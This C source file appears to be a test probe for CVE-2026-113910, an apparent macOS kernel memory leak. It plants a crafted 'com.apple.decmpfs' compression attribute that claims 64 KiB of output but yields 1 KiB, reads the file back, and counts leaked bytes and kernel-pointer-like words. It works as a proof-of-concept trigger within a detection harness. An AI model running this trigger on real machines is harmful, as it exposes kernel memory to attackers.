#include "CVE113910Probe.h"

#include <errno.h>
#include <fcntl.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <sys/xattr.h>
#include <unistd.h>

volatile int32_t cve_2026_113910_setxattr_result = INT32_MIN;
volatile int32_t cve_2026_113910_setflags_result = INT32_MIN;
volatile int32_t cve_2026_113910_truncate_result = INT32_MIN;
volatile int32_t cve_2026_113910_stat_result = INT32_MIN;
volatile uint32_t cve_2026_113910_observed_flags = 0;
volatile int64_t cve_2026_113910_observed_size = -1;
volatile uint32_t cve_2026_113910_payload_size = 0;
volatile int64_t cve_2026_113910_read_count = -1;
volatile uint32_t cve_2026_113910_unexpected_bytes = 0;
volatile uint32_t cve_2026_113910_untouched_sentinel_bytes = 0;
volatile uint32_t cve_2026_113910_zero_filled_bytes = 0;
volatile uint32_t cve_2026_113910_other_bytes = 0;
volatile uint32_t cve_2026_113910_canonical_pointer_words = 0;
volatile int64_t cve_2026_113910_first_unexpected_offset = -1;
volatile uint64_t cve_2026_113910_observed_hash = 0;

enum {
    PROBE_OUTPUT_SIZE = 65536,
    PROBE_PRODUCED_SIZE = 1024,
    PROBE_MAX_XATTR_SIZE = 3802,
    PROBE_PATH_SIZE = 1024,
};

_Static_assert(PROBE_PRODUCED_SIZE <= UINT16_MAX,
               "stored zlib block length must fit uint16_t");
_Static_assert(PROBE_PRODUCED_SIZE < PROBE_OUTPUT_SIZE,
               "probe must exercise a short-producing stream");

struct byte_buffer {
    uint8_t *data;
    size_t count;
    size_t capacity;
};

static int
buffer_reserve(struct byte_buffer *buffer, size_t additional)
{
    if (additional > SIZE_MAX - buffer->count) {
        return EOVERFLOW;
    }
    size_t needed = buffer->count + additional;
    if (needed <= buffer->capacity) {
        return 0;
    }
    size_t capacity = needed + 64;
    uint8_t *data = realloc(buffer->data, capacity);
    if (data == NULL) {
        return ENOMEM;
    }
    buffer->data = data;
    buffer->capacity = capacity;
    return 0;
}

static int
buffer_append(struct byte_buffer *buffer, const void *bytes, size_t count)
{
    int error = buffer_reserve(buffer, count);
    if (error != 0) {
        return error;
    }
    memcpy(buffer->data + buffer->count, bytes, count);
    buffer->count += count;
    return 0;
}

static int
append_u32_le(struct byte_buffer *buffer, uint32_t value)
{
    uint8_t bytes[4] = {
        (uint8_t)value,
        (uint8_t)(value >> 8),
        (uint8_t)(value >> 16),
        (uint8_t)(value >> 24),
    };
    return buffer_append(buffer, bytes, sizeof(bytes));
}

static int
append_u64_le(struct byte_buffer *buffer, uint64_t value)
{
    uint8_t bytes[8];
    for (unsigned index = 0; index < sizeof(bytes); ++index) {
        bytes[index] = (uint8_t)(value >> (index * 8));
    }
    return buffer_append(buffer, bytes, sizeof(bytes));
}

static uint32_t
adler32_bytes(const uint8_t *bytes, size_t count)
{
    uint32_t a = 1;
    uint32_t b = 0;
    for (size_t index = 0; index < count; ++index) {
        a = (a + bytes[index]) % 65521U;
        b = (b + a) % 65521U;
    }
    return (b << 16) | a;
}

static int
build_short_inline_stream(struct byte_buffer *payload)
{
    int error = append_u32_le(payload, UINT32_C(0x636d7066)); /* cmpf */
    if (error == 0) error = append_u32_le(payload, 3); /* inline zlib */
    if (error == 0) error = append_u64_le(payload, PROBE_OUTPUT_SIZE);

    /* One stored zlib block that produces 1024 bytes for a 64 KiB claim. */
    const uint8_t prefix[] = {0x78, 0x01, 0x01, 0x00, 0x04, 0xff, 0xfb};
    if (error == 0) error = buffer_append(payload, prefix, sizeof(prefix));
    if (error == 0) {
        uint8_t produced[PROBE_PRODUCED_SIZE];
        memset(produced, 'A', sizeof(produced));
        error = buffer_append(payload, produced, sizeof(produced));
        uint32_t checksum = adler32_bytes(produced, sizeof(produced));
        uint8_t checksum_be[4] = {
            (uint8_t)(checksum >> 24),
            (uint8_t)(checksum >> 16),
            (uint8_t)(checksum >> 8),
            (uint8_t)checksum,
        };
        if (error == 0) {
            error = buffer_append(payload, checksum_be, sizeof(checksum_be));
        }
    }
    return error;
}

static int
write_baseline_file(const char *path)
{
    int fd = open(path, O_CREAT | O_TRUNC | O_WRONLY, 0600);
    if (fd < 0) {
        return errno;
    }
    uint8_t block[4096];
    memset(block, 'A', sizeof(block));
    size_t written = 0;
    while (written < PROBE_OUTPUT_SIZE) {
        size_t remaining = PROBE_OUTPUT_SIZE - written;
        size_t request = remaining < sizeof(block) ? remaining : sizeof(block);
        ssize_t result = write(fd, block, request);
        if (result <= 0) {
            int error = errno != 0 ? errno : EIO;
            close(fd);
            return error;
        }
        written += (size_t)result;
    }
    return close(fd) == 0 ? 0 : errno;
}

static int
is_canonical_kernel_word(uint64_t value)
{
    return (value & UINT64_C(0xffff000000000000)) ==
               UINT64_C(0xffff000000000000) &&
           value != UINT64_MAX;
}

int32_t
cve_2026_113910_probe_run(const char *base_directory)
{
    cve_2026_113910_setxattr_result = INT32_MIN;
    cve_2026_113910_setflags_result = INT32_MIN;
    cve_2026_113910_truncate_result = INT32_MIN;
    cve_2026_113910_stat_result = INT32_MIN;
    cve_2026_113910_observed_flags = 0;
    cve_2026_113910_observed_size = -1;
    cve_2026_113910_payload_size = 0;
    cve_2026_113910_read_count = -1;
    cve_2026_113910_unexpected_bytes = 0;
    cve_2026_113910_untouched_sentinel_bytes = 0;
    cve_2026_113910_zero_filled_bytes = 0;
    cve_2026_113910_other_bytes = 0;
    cve_2026_113910_canonical_pointer_words = 0;
    cve_2026_113910_first_unexpected_offset = -1;
    cve_2026_113910_observed_hash = UINT64_C(14695981039346656037);

    if (base_directory == NULL) {
        return EINVAL;
    }
    char path[PROBE_PATH_SIZE];
    int length = snprintf(path, sizeof(path), "%s/%s", base_directory,
                          "cve-2026-113910.bin");
    if (length < 0 || (size_t)length >= sizeof(path)) {
        return ENAMETOOLONG;
    }

    unlink(path);
    int error = write_baseline_file(path);
    if (error != 0) {
        return error;
    }

    struct byte_buffer payload = {0};
    error = build_short_inline_stream(&payload);
    if (error == 0 && payload.count > PROBE_MAX_XATTR_SIZE) {
        error = E2BIG;
    }
    if (error != 0) {
        free(payload.data);
        unlink(path);
        return error;
    }
    cve_2026_113910_payload_size = (uint32_t)payload.count;

    if (setxattr(path, "com.apple.decmpfs", payload.data, payload.count,
                 0, 0) == 0) {
        cve_2026_113910_setxattr_result = 0;
    } else {
        cve_2026_113910_setxattr_result = errno;
    }
    free(payload.data);

    if (cve_2026_113910_setxattr_result == 0) {
        if (truncate(path, 0) == 0) {
            cve_2026_113910_truncate_result = 0;
        } else {
            cve_2026_113910_truncate_result = errno;
        }
    } else {
        cve_2026_113910_truncate_result = cve_2026_113910_setxattr_result;
    }

#ifdef UF_COMPRESSED
    if (cve_2026_113910_truncate_result == 0) {
        if (chflags(path, UF_COMPRESSED) == 0) {
            cve_2026_113910_setflags_result = 0;
        } else {
            cve_2026_113910_setflags_result = errno;
        }
    } else {
        cve_2026_113910_setflags_result = cve_2026_113910_truncate_result;
    }
#else
    cve_2026_113910_setflags_result = ENOTSUP;
#endif

    struct stat status;
    if (stat(path, &status) == 0) {
        cve_2026_113910_stat_result = 0;
        cve_2026_113910_observed_flags = status.st_flags;
        cve_2026_113910_observed_size = status.st_size;
    } else {
        cve_2026_113910_stat_result = errno;
    }

    uint8_t *output = malloc(PROBE_OUTPUT_SIZE);
    if (output == NULL) {
        unlink(path);
        return ENOMEM;
    }
    memset(output, 0x5a, PROBE_OUTPUT_SIZE);
    int fd = open(path, O_RDONLY);
    if (fd >= 0) {
        ssize_t count = read(fd, output, PROBE_OUTPUT_SIZE);
        cve_2026_113910_read_count = count;
        close(fd);
        if (count > 0) {
            for (ssize_t index = 0; index < count; ++index) {
                cve_2026_113910_observed_hash ^= output[index];
                cve_2026_113910_observed_hash *= UINT64_C(1099511628211);
                if (output[index] != 'A') {
                    if (cve_2026_113910_first_unexpected_offset < 0) {
                        cve_2026_113910_first_unexpected_offset = index;
                    }
                    ++cve_2026_113910_unexpected_bytes;
                    if (output[index] == 0x5a) {
                        ++cve_2026_113910_untouched_sentinel_bytes;
                    } else if (output[index] == 0) {
                        ++cve_2026_113910_zero_filled_bytes;
                    } else {
                        ++cve_2026_113910_other_bytes;
                    }
                }
            }
            /* Kernel data need not begin at an 8-byte offset in the output. */
            for (ssize_t index = 0; index + 8 <= count; ++index) {
                uint64_t word = 0;
                memcpy(&word, output + index, sizeof(word));
                if (is_canonical_kernel_word(word)) {
                    ++cve_2026_113910_canonical_pointer_words;
                }
            }
        }
    } else {
        cve_2026_113910_read_count = -errno;
    }

    printf("[CVE-2026-113910 gate] payload=%u setxattr=%d truncate=%d setflags=%d "
           "stat=%d flags=0x%x size=%lld read=%lld "
           "unexpected=%u sentinel=%u zero=%u other=%u first=%lld "
           "canonical-words=%u hash=0x%llx\n",
           cve_2026_113910_payload_size,
           cve_2026_113910_setxattr_result,
           cve_2026_113910_truncate_result,
           cve_2026_113910_setflags_result,
           cve_2026_113910_stat_result,
           cve_2026_113910_observed_flags,
           (long long)cve_2026_113910_observed_size,
           (long long)cve_2026_113910_read_count,
           cve_2026_113910_unexpected_bytes,
           cve_2026_113910_untouched_sentinel_bytes,
           cve_2026_113910_zero_filled_bytes,
           cve_2026_113910_other_bytes,
           (long long)cve_2026_113910_first_unexpected_offset,
           cve_2026_113910_canonical_pointer_words,
           (unsigned long long)cve_2026_113910_observed_hash);

    free(output);
    unlink(path);
    if (cve_2026_113910_setxattr_result != 0 ||
        cve_2026_113910_truncate_result != 0 ||
        cve_2026_113910_setflags_result != 0 ||
        cve_2026_113910_stat_result != 0 ||
        (cve_2026_113910_observed_flags & UF_COMPRESSED) == 0 ||
        cve_2026_113910_observed_size != PROBE_OUTPUT_SIZE) {
        return 2;
    }
    if (cve_2026_113910_read_count <= 0) {
        return 5;
    }
    if (cve_2026_113910_canonical_pointer_words != 0) {
        return 0;
    }
    if (cve_2026_113910_other_bytes != 0) {
        return 1;
    }
    if (cve_2026_113910_unexpected_bytes != 0) {
        return 4;
    }
    return 3;
}
